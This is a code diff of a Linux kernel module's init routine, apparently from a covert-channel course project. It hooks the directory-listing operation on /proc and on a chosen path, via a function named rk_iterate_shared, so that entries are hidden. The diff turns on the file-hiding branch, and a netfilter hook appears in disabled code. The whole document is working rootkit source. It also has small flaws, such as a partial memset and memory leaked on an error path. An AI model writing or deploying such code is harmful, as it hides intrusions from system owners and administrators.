@@ -680,9 +680,10 @@ static int __init mod_init(void) {
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
+    const char *user_input = "/aing-matrix";
+
     char *user_string = kmalloc(100, GFP_KERNEL);
-    //strcpy(user_string, "/aing-matrix");
-    strcpy(user_string, "/home/john/Documents/BCIT/COMP8505/8505-final/covert_module.c");
+    strcpy(user_string, user_input);
     char *user_file = kmalloc(100, GFP_KERNEL);
     memset(user_file, 0, 40);
 
@@ -700,9 +701,6 @@ static int __init mod_init(void) {
     }
 
     printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_string, user_file);
-
-    kfree(user_string);
-    kfree(user_file);
 
 #if 0
     if (kern_path("/aing-matrix", 0, &my_file_path)) {
@@ -722,7 +720,19 @@ static int __init mod_init(void) {
     backup_file_ops = my_file_inode->i_fop;
     file_ops.iterate_shared = rk_iterate_shared;
     my_file_inode->i_fop = &file_ops;
+#else
+    if (kern_path(user_string, 0, &my_file_path)) {
+        return -1;
+    }
+    my_file_inode = my_file_path.dentry->d_inode;
+    file_ops = *my_file_inode->i_fop;
+    backup_file_ops = my_file_inode->i_fop;
+    file_ops.iterate_shared = rk_iterate_shared;
+    my_file_inode->i_fop = &file_ops;
 #endif
+
+    kfree(user_string);
+    kfree(user_file);
 
 #if 0
     nfhi.hook = incoming_hook;
